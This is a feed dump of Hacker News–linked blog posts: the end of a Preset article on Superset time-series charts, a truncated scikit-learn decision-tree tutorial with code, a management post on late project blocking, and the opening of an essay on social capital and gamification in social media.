<p>Changing granularity to <strong><em>Week</em></strong> will reduce the number of data points on the X-axis and will make the graph clear to follow and integrate in a dashboard.</p>
<div><p><a href="https://preset.io/static/3a0fbb4f274dec4b85248badf7579e4b/2f950/image3.png" target="_blank" rel="noopener">
    <span>
    <span></span>
    <img alt="GitHub API doc" title="image_tooltip" src="https://preset.io/static/3a0fbb4f274dec4b85248badf7579e4b/f6afc/image3.png" srcset="https://preset.io/static/3a0fbb4f274dec4b85248badf7579e4b/7b5b4/image3.png 188w,
https://preset.io/static/3a0fbb4f274dec4b85248badf7579e4b/a80c4/image3.png 376w,
https://preset.io/static/3a0fbb4f274dec4b85248badf7579e4b/f6afc/image3.png 752w,
https://preset.io/static/3a0fbb4f274dec4b85248badf7579e4b/3f9be/image3.png 1128w,
https://preset.io/static/3a0fbb4f274dec4b85248badf7579e4b/a34ba/image3.png 1504w,
https://preset.io/static/3a0fbb4f274dec4b85248badf7579e4b/2f950/image3.png 1600w" sizes="(max-width: 752px) 100vw, 752px">
  </span>
  </a></p></div>
<h2 id="line-chart"><a href="#line-chart" aria-label="line chart permalink"></a>Line Chart</h2>
<p>Line charts are used if you want to compare several series at the same time.</p>
<div><p><a href="https://preset.io/static/7e892a48698908b23493a1d04e2538e0/2f950/image4.png" target="_blank" rel="noopener">
    <span>
    <span></span>
    <img alt="GitHub API doc" title="image_tooltip" src="https://preset.io/static/7e892a48698908b23493a1d04e2538e0/f6afc/image4.png" srcset="https://preset.io/static/7e892a48698908b23493a1d04e2538e0/7b5b4/image4.png 188w,
https://preset.io/static/7e892a48698908b23493a1d04e2538e0/a80c4/image4.png 376w,
https://preset.io/static/7e892a48698908b23493a1d04e2538e0/f6afc/image4.png 752w,
https://preset.io/static/7e892a48698908b23493a1d04e2538e0/3f9be/image4.png 1128w,
https://preset.io/static/7e892a48698908b23493a1d04e2538e0/a34ba/image4.png 1504w,
https://preset.io/static/7e892a48698908b23493a1d04e2538e0/2f950/image4.png 1600w" sizes="(max-width: 752px) 100vw, 752px">
  </span>
  </a></p></div>
<p>However, adding too many series (e.g., many distinct values in the Group By field) could make it difficult to understand and conceptualize the series. In this case, it is useful to use Series Limit to reduce the number of series.</p>
<div><p><a href="https://preset.io/static/994c47a1fd8c9fc046bd2f6685c7e6f6/2f950/image5.png" target="_blank" rel="noopener">
    <span>
    <span></span>
    <img alt="GitHub API doc" title="image_tooltip" src="https://preset.io/static/994c47a1fd8c9fc046bd2f6685c7e6f6/f6afc/image5.png" srcset="https://preset.io/static/994c47a1fd8c9fc046bd2f6685c7e6f6/7b5b4/image5.png 188w,
https://preset.io/static/994c47a1fd8c9fc046bd2f6685c7e6f6/a80c4/image5.png 376w,
https://preset.io/static/994c47a1fd8c9fc046bd2f6685c7e6f6/f6afc/image5.png 752w,
https://preset.io/static/994c47a1fd8c9fc046bd2f6685c7e6f6/3f9be/image5.png 1128w,
https://preset.io/static/994c47a1fd8c9fc046bd2f6685c7e6f6/a34ba/image5.png 1504w,
https://preset.io/static/994c47a1fd8c9fc046bd2f6685c7e6f6/2f950/image5.png 1600w" sizes="(max-width: 752px) 100vw, 752px">
  </span>
  </a></p></div>
<h2 id="area-chart"><a href="#area-chart" aria-label="area chart permalink"></a>Area Chart</h2>
<p>Area chart are similar to line chart in that they represent variables with the same scale, but area charts stack the metrics on top of each other. An area chart in Superset can be stream, stack, or expand.</p>
<p>By simply changing the Visualization Type, we can display the line chart above as an area chart</p>
<div><p><a href="https://preset.io/static/40ccbd87f3bb57a2373fe8ee3871523e/2f950/image6.png" target="_blank" rel="noopener">
    <span>
    <span></span>
    <img alt="GitHub API doc" title="image_tooltip" src="https://preset.io/static/40ccbd87f3bb57a2373fe8ee3871523e/f6afc/image6.png" srcset="https://preset.io/static/40ccbd87f3bb57a2373fe8ee3871523e/7b5b4/image6.png 188w,
https://preset.io/static/40ccbd87f3bb57a2373fe8ee3871523e/a80c4/image6.png 376w,
https://preset.io/static/40ccbd87f3bb57a2373fe8ee3871523e/f6afc/image6.png 752w,
https://preset.io/static/40ccbd87f3bb57a2373fe8ee3871523e/3f9be/image6.png 1128w,
https://preset.io/static/40ccbd87f3bb57a2373fe8ee3871523e/a34ba/image6.png 1504w,
https://preset.io/static/40ccbd87f3bb57a2373fe8ee3871523e/2f950/image6.png 1600w" sizes="(max-width: 752px) 100vw, 752px">
  </span>
  </a></p></div>
<p>By customizing the chart, we can view different variations. Here is a Stream Area Chart (Customize → Stacked Style → stream):</p>
<div><p><a href="https://preset.io/static/8cc038830ff4853e98eeb7afde98c760/2f950/image6_5.png" target="_blank" rel="noopener">
    <span>
    <span></span>
    <img alt="GitHub API doc" title="image_tooltip" src="https://preset.io/static/8cc038830ff4853e98eeb7afde98c760/f6afc/image6_5.png" srcset="https://preset.io/static/8cc038830ff4853e98eeb7afde98c760/7b5b4/image6_5.png 188w,
https://preset.io/static/8cc038830ff4853e98eeb7afde98c760/a80c4/image6_5.png 376w,
https://preset.io/static/8cc038830ff4853e98eeb7afde98c760/f6afc/image6_5.png 752w,
https://preset.io/static/8cc038830ff4853e98eeb7afde98c760/3f9be/image6_5.png 1128w,
https://preset.io/static/8cc038830ff4853e98eeb7afde98c760/a34ba/image6_5.png 1504w,
https://preset.io/static/8cc038830ff4853e98eeb7afde98c760/2f950/image6_5.png 1600w" sizes="(max-width: 752px) 100vw, 752px">
  </span>
  </a></p></div>
<p>...and this chart is customized as an Expanded Area Chart <em>(Customize → Stacked Style → expand)</em> where the Y values are not the metrics value, but the % of contribution on the total of the metric:</p>
<div><p><a href="https://preset.io/static/b1b84f3c572f493c7e4dc04cedbcb962/2f950/image7.png" target="_blank" rel="noopener">
    <span>
    <span></span>
    <img alt="GitHub API doc" title="image_tooltip" src="https://preset.io/static/b1b84f3c572f493c7e4dc04cedbcb962/f6afc/image7.png" srcset="https://preset.io/static/b1b84f3c572f493c7e4dc04cedbcb962/7b5b4/image7.png 188w,
https://preset.io/static/b1b84f3c572f493c7e4dc04cedbcb962/a80c4/image7.png 376w,
https://preset.io/static/b1b84f3c572f493c7e4dc04cedbcb962/f6afc/image7.png 752w,
https://preset.io/static/b1b84f3c572f493c7e4dc04cedbcb962/3f9be/image7.png 1128w,
https://preset.io/static/b1b84f3c572f493c7e4dc04cedbcb962/a34ba/image7.png 1504w,
https://preset.io/static/b1b84f3c572f493c7e4dc04cedbcb962/2f950/image7.png 1600w" sizes="(max-width: 752px) 100vw, 752px">
  </span>
  </a></p></div>
<h2 id="chart-with-two-metrics-of-different-scales"><a href="#chart-with-two-metrics-of-different-scales" aria-label="chart with two metrics of different scales permalink"></a>Chart with Two Metrics of Different Scales</h2>
<p> In many cases, you may want to compare two or more metrics of different scales; consequently, there is need for a second Y-axis. Provided that the data source is the same, the Dual Line Chart in Preset is ideal in such a scenario.</p>
<div><p><a href="https://preset.io/static/95a02e57cb6ce0fa77c2d5b5273815a7/2f950/image8.png" target="_blank" rel="noopener">
    <span>
    <span></span>
    <img alt="GitHub API doc" title="image_tooltip" src="https://preset.io/static/95a02e57cb6ce0fa77c2d5b5273815a7/f6afc/image8.png" srcset="https://preset.io/static/95a02e57cb6ce0fa77c2d5b5273815a7/7b5b4/image8.png 188w,
https://preset.io/static/95a02e57cb6ce0fa77c2d5b5273815a7/a80c4/image8.png 376w,
https://preset.io/static/95a02e57cb6ce0fa77c2d5b5273815a7/f6afc/image8.png 752w,
https://preset.io/static/95a02e57cb6ce0fa77c2d5b5273815a7/3f9be/image8.png 1128w,
https://preset.io/static/95a02e57cb6ce0fa77c2d5b5273815a7/a34ba/image8.png 1504w,
https://preset.io/static/95a02e57cb6ce0fa77c2d5b5273815a7/2f950/image8.png 1600w" sizes="(max-width: 752px) 100vw, 752px">
  </span>
  </a></p></div>
<h2 id="smoothing-the-curve"><a href="#smoothing-the-curve" aria-label="smoothing the curve permalink"></a>Smoothing the Curve</h2>
<p>Sometimes when looking at data points on a per day basis, it is difficult to determine trends and data variance. For example, the chart below shows the top American states with new Covid-19 cases on a per day basis (taken over the last month). This view makes it difficult to discern a clear trend.</p>
<div><p><a href="https://preset.io/static/f4cc2d0abd922a476354b9eb9697e6b5/2f950/image9.png" target="_blank" rel="noopener">
    <span>
    <span></span>
    <img alt="GitHub API doc" title="image_tooltip" src="https://preset.io/static/f4cc2d0abd922a476354b9eb9697e6b5/f6afc/image9.png" srcset="https://preset.io/static/f4cc2d0abd922a476354b9eb9697e6b5/7b5b4/image9.png 188w,
https://preset.io/static/f4cc2d0abd922a476354b9eb9697e6b5/a80c4/image9.png 376w,
https://preset.io/static/f4cc2d0abd922a476354b9eb9697e6b5/f6afc/image9.png 752w,
https://preset.io/static/f4cc2d0abd922a476354b9eb9697e6b5/3f9be/image9.png 1128w,
https://preset.io/static/f4cc2d0abd922a476354b9eb9697e6b5/a34ba/image9.png 1504w,
https://preset.io/static/f4cc2d0abd922a476354b9eb9697e6b5/2f950/image9.png 1600w" sizes="(max-width: 752px) 100vw, 752px">
  </span>
  </a></p></div>
<p>In order to gain a greater insight into this data, we recommend smoothing out the short-term fluctuations between data points by applying a moving average. The moving average—available in the <em>Advance Analytics function</em>—applies the average between defined X periods instead of marking actual data points by date.</p>
<p>If we apply this technique to the previous chart by using the moving average over the last 7 days, the lines in the chart will be smoothed out and facilitate the recognition of trends.</p>
<div><p><a href="https://preset.io/static/e15c3088380b6e2e365bb2c66bea4b7b/2f950/image10.png" target="_blank" rel="noopener">
    <span>
    <span></span>
    <img alt="GitHub API doc" title="image_tooltip" src="https://preset.io/static/e15c3088380b6e2e365bb2c66bea4b7b/f6afc/image10.png" srcset="https://preset.io/static/e15c3088380b6e2e365bb2c66bea4b7b/7b5b4/image10.png 188w,
https://preset.io/static/e15c3088380b6e2e365bb2c66bea4b7b/a80c4/image10.png 376w,
https://preset.io/static/e15c3088380b6e2e365bb2c66bea4b7b/f6afc/image10.png 752w,
https://preset.io/static/e15c3088380b6e2e365bb2c66bea4b7b/3f9be/image10.png 1128w,
https://preset.io/static/e15c3088380b6e2e365bb2c66bea4b7b/a34ba/image10.png 1504w,
https://preset.io/static/e15c3088380b6e2e365bb2c66bea4b7b/2f950/image10.png 1600w" sizes="(max-width: 752px) 100vw, 752px">
  </span>
  </a></p></div>
<h2 id="time-comparison"><a href="#time-comparison" aria-label="time comparison permalink"></a>Time Comparison</h2>
<p>Sometimes looking at a trend is not enough to see how the data values are changing. In those cases, we recommend using the line chart count with Time Comparison function. This creates a second dotted line in the chart that shifts the time as specified.</p>
<div><p><a href="https://preset.io/static/f8c04e90b9c60a300652acc2ddd8db61/2f950/image11.png" target="_blank" rel="noopener">
    <span>
    <span></span>
    <img alt="GitHub API doc" title="image_tooltip" src="https://preset.io/static/f8c04e90b9c60a300652acc2ddd8db61/f6afc/image11.png" srcset="https://preset.io/static/f8c04e90b9c60a300652acc2ddd8db61/7b5b4/image11.png 188w,
https://preset.io/static/f8c04e90b9c60a300652acc2ddd8db61/a80c4/image11.png 376w,
https://preset.io/static/f8c04e90b9c60a300652acc2ddd8db61/f6afc/image11.png 752w,
https://preset.io/static/f8c04e90b9c60a300652acc2ddd8db61/3f9be/image11.png 1128w,
https://preset.io/static/f8c04e90b9c60a300652acc2ddd8db61/a34ba/image11.png 1504w,
https://preset.io/static/f8c04e90b9c60a300652acc2ddd8db61/2f950/image11.png 1600w" sizes="(max-width: 752px) 100vw, 752px">
  </span>
  </a></p></div>
<h2 id="summary"><a href="#summary" aria-label="summary permalink"></a>Summary</h2>
<p>In this article we summarized the importance of Time Series Visualizations and how powerful they are in terms of visualizing time series data. There are many other visualizations in Superset for your time series data — as a first step, try changing the visualization type to see the different representations available to you.</p>
<p>In the next blog article we will discuss <strong><em>Geospatial Visualization Types</em></strong>.</p></div></div>]]>
            </description>
            <link>https://preset.io/blog/2020-06-26-timeseries-chart/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23709687</guid>
            <pubDate>Thu, 02 Jul 2020 03:32:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Decision Tree in Sklearn – A Complete Guide]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23709650">thread link</a>) | @min2bro
<br/>
July 1, 2020 | https://kanoki.org/2020/05/13/decision-tree-in-sklearn/ | <a href="https://web.archive.org/web/*/https://kanoki.org/2020/05/13/decision-tree-in-sklearn/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<p>In this post we are going to see how to build a basic decision tree classifier using scikit-learn package and how to use it for doing multi-class classification on a dataset.</p>

<p>Decision trees is an efficient and non-parametric method that can be applied either to classification or to regression tasks.</p>

<p>To predict the dependent variable the input space is split into local regions because they are hierarchical data structures for supervised learning</p>

<p>Decision tree is a simple to learn and easy to interpret and Visualize the decisions in a tree format. It has the advantage of producing comprehensible classification/regression model with satisfactory accuracy level.</p>

<p>We will be exploring the DecisionTreeClassifier function of sklearn and all the parameters of it. You will also see how to Visualize the decision tree Rules and the Boundaries that model is creating to classify the different Classes(targets)</p>

<h2 id="decision-tree-classifier-in-sklearn"><strong>Decision Tree Classifier in Sklearn</strong></h2>

<div><div><pre><code>sklearn.tree.DecisionTreeClassifier(_criterion='gini'_,&nbsp;_splitter='best'_,&nbsp;_max_depth=None_,
&nbsp;
_min_samples_split=2_,&nbsp;_min_samples_leaf=1_,&nbsp;_min_weight_fraction_leaf=0.0_,&nbsp;_max_features=None_,&nbsp;

_random_state=None_,&nbsp;_max_leaf_nodes=None_,&nbsp;_min_impurity_decrease=0.0_,&nbsp;_min_impurity_split=None_,&nbsp;

_class_weight=None_,&nbsp;&nbsp;_ccp_alpha=0.0_)
</code></pre></div></div>

<h2 id="parameters"><strong>Parameters</strong></h2>

<h3 id="criterion"><strong>criterion</strong></h3>

<p>Gini or entropy and default is Gini.</p>

<p>One of the Critical factor is to choose which feature for splitting the nodes in subsets and for making that decision we choose out of these two criteria</p>

<ul>
  <li>Information Theory (Entropy)</li>
  <li>Distance Based (Gini)</li>
</ul>

<p>Both are impurity measures and it looks like the selection of impurity measure has little effect on the performance of single decision tree algorithms</p>

<p>The impurity is measured before and after splitting a node according to each possible attribute.</p>

<p>The attribute which presents the greater gain in purity, i.e., that maximizes the difference of impurity taken before and after splitting the node, is chosen</p>

<p>Entropy might be a little slower to compute because it makes use of the logarithm</p>

<h3 id="splitter"><strong>Splitter</strong></h3>

<p>Strategy to choose out of best or random. Default is best</p>

<p>If the best strategy is chosen then it will split on the most important feature first</p>

<p>it will choose a feature on random for splitting the node if splitter set to random which could lead to accuracy and more depth in the decision tree</p>

<h3 id="max_depth"><strong>max_depth</strong></h3>

<p>The maximum depth of the tree.</p>

<p>One of the stopping criteria that let you decide when to terminate the tree building process. A tree can be grown until a maximum depth is reached.</p>

<p>A tree can be grown to a maximum depth of N-1 where N is the number of samples</p>

<p>Beside max_depth there are other stopping criteria as well so in reality a tree will never go a maximum depth of N-1</p>

<p>Mostly we try to pick the optimal depth based on cross-validation and decides the reasonable max_depth value</p>

<h3 id="min_samples_split"><strong>min_samples_split</strong></h3>

<p>The minimum number of samples required at an Internal node for splitting. Say for example min_samples_split = 5 and there are 8 samples at a decision node then the split is allowed otherwise if &lt;5 then not allowed.</p>

<p>if <strong>min_sample_leaf</strong> = 2 and one leaf has 1 sample and other has 6 samples then the split is not allowed</p>

<p>so min_samples_split depends on the min-sample_leaf defined as well</p>

<p><img src="https://kanoki.org/images/2020/05/image-6.png" alt=""></p>

<h3 id="min_samples_leaf"><strong>min_samples_leaf</strong></h3>

<p>The minimum number of samples required at a leaf node</p>

<h3 id="min_weight_fraction_leaf"><strong>min_weight_fraction_leaf</strong></h3>

<p>The minimum weighted fraction</p>

<div><div><pre><code>`fit`(_self_,&nbsp;_X_,&nbsp;_y_,&nbsp;_sample_weight=None_,&nbsp;_check_input=True_,&nbsp;_X_idx_sorted=None_)
</code></pre></div></div>

<p>this parameter decides the required fraction of samples (or weights) in each leaf node</p>

<p>It uses the weight defined for each sample thru the fit method that has a <strong>sample_weight</strong> which lets you specify the weight of each of the samples and accepts values in an array like format for n_samples</p>

<p>if a minimum weight fraction is set and the sample weight is None then it will assume a uniform weight for all the samples</p>

<h3 id="max_features"><strong>max_features</strong></h3>

<p>It defines the number of features to be used for best split.</p>

<p>It is used to control the over-fitting. For example if the shape of your data is 30 and max_feature is set to 5.</p>

<p>So Every time at a decision node you will choose maximum of 5 features that are selected randomly for splitting</p>

<h3 id="random_state"><strong>random_state</strong></h3>

<p>It is the seed used by the random number generator. it is basically used to make the result or outcome of the classifier consistent.</p>

<p>It hardly matters what number you select but if you select the same number each time then the output remains deterministic</p>

<h3 id="max_leaf_node"><strong>max_leaf_node</strong></h3>

<p>maximum leaf node. It is one of the stopping criteria to grow a tree wih max_leaf_node.</p>

<p>By default it is set to None which means it will grow to unlimited leaf nodes and other stopping criteria will be considered</p>

<p>from the official <a href="https://scikit-learn.org/stable/modules/generated/sklearn.tree.DecisionTreeClassifier.html">documentation</a> the formula for weighted impurity decrease is as follows:</p>

<div><div><pre><code>N_t / N * (impurity - N_t_R / N_t * right_impurity
                    - N_t_L / N_t * left_impurity)
</code></pre></div></div>

<p>This formula takes into account how much the parent node makes up of the total tree (N_t / N) and the weighted impurity decrease from the child nodes.</p>

<p>If the final impurity decrease is less than the minimum impurity decrease parameter, then the split will not be performed</p>

<h3 id="class_weight"><strong>class_weight</strong></h3>

<p>By default all the classes have same weight i.e. 1</p>

<p>The class_weight parameter deals well with unbalanced classes by giving
more weight to the under represented classes.</p>

<p>It is used for re-weighting the splitting criterion</p>

<p>Higher the class_weight more you want to put emphasis on that class.</p>

<p>For multi-output, class_weights will be multiplied with <strong>sample_weight</strong> (passed through the fit method) if <strong>sample_weight</strong> is specified</p>

<h2 id="get-started"><strong>Get Started</strong></h2>

<p>We will use the wine dataset from sklearn.</p>

<p>Let’s load the data and then will split into train and test sets</p>

<div><div><pre><code>from sklearn import datasets
from sklearn.tree import DecisionTreeClassifier
wine_data = datasets.load_wine()
</code></pre></div></div>

<p>Let’s check out the important keys in this dataset</p>



<div><div><pre><code>dict_keys(['data', 'target', 'target_names', 'DESCR', 'feature_names'])
</code></pre></div></div>

<p>So we have data, target variables with their names stored in target_names and feature names</p>

<p>Let’s find out the features in the data that we will use to train the decision tree classifier</p>



<div><div><pre><code>['alcohol',
 'malic_acid',
 'ash',
 'alcalinity_of_ash',
 'magnesium',
 'total_phenols',
 'flavanoids',
 'nonflavanoid_phenols',
 'proanthocyanins',
 'color_intensity',
 'hue',
 'od280/od315_of_diluted_wines',
 'proline']
</code></pre></div></div>

<p>Here are the different classes or targets in which each of these data is classified to i.e. class_0, class_1 and class_2</p>



<div><div><pre><code>**array(['class_0', 'class_1', 'class_2'], dtype='&lt;U7')**
</code></pre></div></div>

<p>Finally lets check the data by importing it into a Dataframe object. So you can visualize how the data looks like</p>

<div><div><pre><code>import pandas as pd
pd.DataFrame(wine_data.data,columns=wine_data.feature_names)
</code></pre></div></div>

<p>We can see there are 178 rows and 13 features in this dataset.</p>

<p><img src="https://kanoki.org/images/2020/05/image-7.png" alt=""></p>

<h2 id="train-test-split"><strong>Train Test Split</strong></h2>

<p>We have split the data into training and test set using sklearn train_test_split</p>

<div><div><pre><code>from sklearn.model_selection import train_test_split
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3,
stratify=y)
</code></pre></div></div>

<h2 id="accuracy-score-and-cross-validation"><strong>Accuracy Score and Cross Validation</strong></h2>

<p>Lets measure the testing accuracy using sklearn accuracy_score.</p>

<p>For that we are going to instantiate the Decision tree classifier and then use the fit method on Train data.</p>

<p>Predict method of decision tree classifier will find the target class for the test data</p>

<p>Finally we will calculate the accuracy on our test data prediction</p>

<div><div><pre><code>from sklearn.metrics import accuracy_score

clf = DecisionTreeClassifier() #Instantiate Decision tree classifier
clf.fit(X_train, y_train)      # Use fit method on the train data

y_pred = clf.predict(X_test)   # Predict the target class of test data
accuracy_score(y_test, y_pred)  # Measure Accuracy
</code></pre></div></div>

<p>Let’s evaluate the cross validation score as well</p>

<div><div><pre><code>from sklearn.model_selection import cross_val_score
scores = cross_val_score(clf, X_test, y_test, cv=5)
print("Accuracy: %0.2f (+/- %0.2f)" % (scores.mean(), scores.std() * 2))
</code></pre></div></div>

<h2 id="visualize-decision-tree-using-plot_tree"><strong>Visualize Decision Tree using plot_tree</strong></h2>

<p>You can also Visualize the final decision tree by using the plot_tree function of the sklearn.</p>

<p>There are other ways to visualize using pydot and graphviz but I’m not going to discuss those methods in this post</p>

<div><div><pre><code>%matplotlib inline
from matplotlib.pyplot import figure
from sklearn.tree import plot_tree
figure(num=None, figsize=(20, 6), dpi=80, facecolor='w', edgecolor='k')
plot_tree(clf.fit(wine_data.data, wine_data.target))
</code></pre></div></div>

<p><img src="https://kanoki.org/images/2020/05/image.png" alt=""></p>

<h2 id="gridsearchcv"><strong>GridSearchCV</strong></h2>

<p>Hyper parameters selection is an important part for model selection. how would you know what combinations of these parameters will give you the best outcome?</p>

<p>One way is randomly selecting these values and see which combinations of parameters will give best result.</p>

<p>Isn’t that tedious to do? So Grid Search in Scikit-learn exactly does the same thing and helps to find the best estimator</p>

<div><div><pre><code>from sklearn.model_selection import GridSearchCV, cross_val_score
param_grid = {'criterion':['gini','entropy'], 'max_depth' :
[3,5,7,20]}
grid_search = GridSearchCV(clf,param_grid=param_grid,cv=5)
grid_search.fit(X_train, y_train)
</code></pre></div></div>

<p><img src="https://kanoki.org/images/2020/05/image-1.png" alt=""></p>

<p>You can see all the criteria and their respective score that gridsearch used to evaluate the best estimate by accessing the params and mean_test_score of grid search object</p>

<p>The params and the mean_test_score keys will give you the parameters and their corresponding results</p>

<div><div><pre><code>grid_search.cv_results_['params']
grid_search.cv_results_['mean_test_score']
</code></pre></div></div>

<div><div><pre><code>([{'criterion': 'gini', 'max_depth': 3},
  {'criterion': 'gini', 'max_depth': 5},
  {'criterion': 'gini', 'max_depth': 7},
  {'criterion': 'gini', 'max_depth': 20},
  {'criterion': 'entropy', 'max_depth': 3},
  {'criterion': 'entropy', 'max_depth': 5},
  {'criterion': 'entropy', 'max_depth': 7},
  {'criterion': 'entropy', 'max_depth': 20}],
 array([0.89466667, 0.878     , 0.88666667, 0.87866667, 0.93533333,
        0.91933333, 0.93533333, 0.91933333]))
</code></pre></div></div>

<h3 id="get-best-estimator"><strong>Get Best Estimator</strong></h3>

<p>We will use the best_estimator_ attribute to find the …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kanoki.org/2020/05/13/decision-tree-in-sklearn/">https://kanoki.org/2020/05/13/decision-tree-in-sklearn/</a></em></p>]]>
            </description>
            <link>https://kanoki.org/2020/05/13/decision-tree-in-sklearn/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23709650</guid>
            <pubDate>Thu, 02 Jul 2020 03:25:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stop Blocking Things at the Last Minute]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23708609">thread link</a>) | @svmanager
<br/>
July 1, 2020 | https://staysaasy.com/management/2020/07/01/Dont-Block-Projects.html | <a href="https://web.archive.org/web/*/https://staysaasy.com/management/2020/07/01/Dont-Block-Projects.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of the most frustrating and common experiences in the workplace is getting work blocked near the finish line. Examples:</p>
<ul>
  <li>A feature is developed over the course of 3 months. In the launch meeting a manager swoops in and declares it can’t be released for security reasons.</li>
  <li>You ask your manager for feedback on a proposal. They don’t respond. You ask again. They give a cursory glance and say “looks good”. A week later you say you’re ready to send it out. Suddenly they flood the document with feedback which ruins your timeline.</li>
  <li>An entire division works on a project for weeks. The minute they make it live the VP of the division storms in and yells “revert!”. The VP is displeased with the styling and insists it can’t be shipped that way.</li>
</ul>

<p>There’s usually one of 3 main causes for this anti-pattern:</p>
<ul>
  <li>Problem 1: Laziness/mis-calculation/ego. The stakeholder thinks it’s more efficient for them to engage with something closer to the finish line than early stage. This is often a gross mis-calculation. Projects are like cruise ships - you want to get to your destination with a lot of little steering along the way, not heroics after things have veered off course.</li>
  <li>Problem 2: Bad process. A critical stakeholder isn’t procedurally involved at the right time. If you find yourself blocking projects regularly, it’s your responsibility to fix this. <a href="https://staysaasy.com/process/2020/04/06/Creating-Good-Process.html">Create good process</a>.</li>
  <li>Problem 3: Micromanagement. The project/proposal didn’t actually need the manager’s feedback, they just can’t help having to put their stamp on everything.</li>
</ul>

<p>The solutions are simple but hard to master:</p>
<ul>
  <li>Answer 1: If you don’t think you need to be involved early, imagine the project goes live without your feedback at all. If you’re comfortable with that, you probably don’t need to be involved early (or at all). If you do need to give feedback, do it early and along the way.</li>
  <li>Answer 2: Make sure you have a process that involves necessary stakeholders at the right time.</li>
  <li>Answer 3: Don’t micromanage.</li>
</ul>

<p>If you mess up and find yourself giving major feedback near the finish line of a project, find ways to say yes and make sure you’re empathizing with the frustration that’s resulting from the late stage changes.</p>



<p>Some people actually take pride in blocking projects. Stakeholders who repeatedly view themselves as “saving the day” when it comes to tanking momentum and releases. They see themselves as a fountain of unique knowledge that prevent disasters.</p>

<p>This is almost always a result of incentives that are grossly mis-aligned. Some organizations have stakeholders who show up late in the game, who are not responsible for other teams being productive, who have 0 incentive to facilitate work and all the incentive to block things.</p>

<p>Companies should incentivize these stakeholders not only for preventing problematic releases, but also for the amount of things teams can get done to their requirements.  This ties their success to both risk management and enablement.</p>

    




  </div></div>]]>
            </description>
            <link>https://staysaasy.com/management/2020/07/01/Dont-Block-Projects.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23708609</guid>
            <pubDate>Thu, 02 Jul 2020 00:36:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rich app, poor app – social capital as currency]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23708585">thread link</a>) | @latc
<br/>
July 1, 2020 | https://4thquadrant.io/articles/mental-models/rich-app-poor-app-social-capital-as-currency/ | <a href="https://web.archive.org/web/*/https://4thquadrant.io/articles/mental-models/rich-app-poor-app-social-capital-as-currency/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="tdi_29_f45">

<div>
<p>When it comes to the most popular platforms in the world, the motives behind certain feature roll-outs or a lack of early monetisation often seems to elude logic. Why hasn’t Whatsapp enabled payments sooner and Twitter moved toward monetisation more aggressively? Why did Facebook quietly roll back its influencer platform a few years ago? More recently, I find myself questioning why Instagram waited years to introduce the Checkout function that would have made it an intimidating e-commerce competitor much earlier in the game.&nbsp;</p>



<p>All of these seemingly spotlight decisions fall into a deliberate strategy tied to the lifeblood of these platforms, social capital. The long game is to cultivate social capital, gamify its distribution and eventually convert it into economic capital. Although social capital, in essence, is ephemeral and intangible, society’s collective agreement that it holds value makes it so – much like money. In that sense, Social Media did for social capital what fiat did for economic capital. No longer as difficult to quantify, it has become the world’s mirror economy with value as tangible to an individual as monetary worth. The most explicit manifestation of this has been the rise of the influencer economy, the traditionally unspoken dynamics of social hierarchies and celebrity culture on steroids and now accessible to the masses.&nbsp;</p>



<p>For social media platforms, social capital is the fuel in their engine. Their business is the pursuit of the perpetual growth of collective social capital on their platform. As the platforms reach stages of greater maturity, the conversion funnel reaches its final stages as well – the very stage Instagram is at the beginning of right now as it attempts to complete the loop of social to economic value creation. In essence, this is the fluid direction of influencer recommendations into convertible commercial transactions within the app. But the question remains – could Instagram have implemented this feature successfully years before this point? The science behind this kind of decision is delicate, social capital must be cultivated and morphed in a way that value is not depleted from or ported away from the platform. Flow theory, a psychological concept of the mind’s ideal state of engagement provides a contextual model for how social media platforms like Instagram have achieved this balance.&nbsp;</p>



<h3>Gamifying social capital: creating a state of flow&nbsp;</h3>



<p>Flow theory, a broader psychological theory on how the optimal balance of skill and challenge creates a state of complete immersion is a core focus of gamification as it is applied in gaming itself, but also across various industries. When it comes to social media, platforms have built their networks through the gamification of social capital, building an immersive and engaging game-like experience around the act of accruing social capital – “how many likes did it get?” now a popular criteria for validity. Both gaming and social media tactically withhold and subsequently trigger endorphins to create products that are addictive by nature.&nbsp; A comparison of how flow is cultivated across gaming and social media reveals a lot about the very habits many of us participate in, on a daily basis.&nbsp;</p>



<p><strong>Skill &amp; Challenge</strong></p>



<p><strong>In gaming –</strong> the game must produce a task challenging enough for the player but not so challenging that the player’s skill level is incapable of completing the task</p>



<p><strong>In social media:</strong> building social capital (offline or online) inherently carries a degree of challenge that requires great effort to meet. The challenge is derived from your context (i.e. your friends or others on the platform) who may have larger followings or more liked photos. As a user’s ‘success’ scales, their field of comparison grows with them, and thereby the challenge increases. This is the mechanism by which individuals are incentivised to perpetually grow their own social capital and therefore the platform’s collective capital.&nbsp;</p>



<p><strong>Engagement</strong></p>



<p><strong>In gaming:</strong> the task has to be active and engaging</p>



<p><strong>In social media:</strong> A challenge in itself is not rewarding enough to prompt or incentivise users to continue their accrual of social capital. The natural feedback loop of validation through followers, likes and other features create psychological self-fulfilment. Sometimes there is economic utility to be derived by those who seek to leverage their social capital beyond just validation. Pursuit of this feedback loop keeps the users active and engaged in the activities of the platform.&nbsp;</p>



<p><strong>Reward</strong></p>



<p><strong>In gaming –</strong> the task has to have clear parameters for success. These clear parameters help to enter and maintain a ‘flow state’ as they indicate progress and quality.</p>



<p><strong>In social media:</strong> Success on social media platforms is measured by metrics like number of followers, likes and views. For users reaping economic rewards as well, the utility of their social capital can also be measured in sponsorships, ads and other forms of social media-driven income. While the latter is not as publicly available information, both types can lead to strong signalling of one’s success on social media.&nbsp;</p>



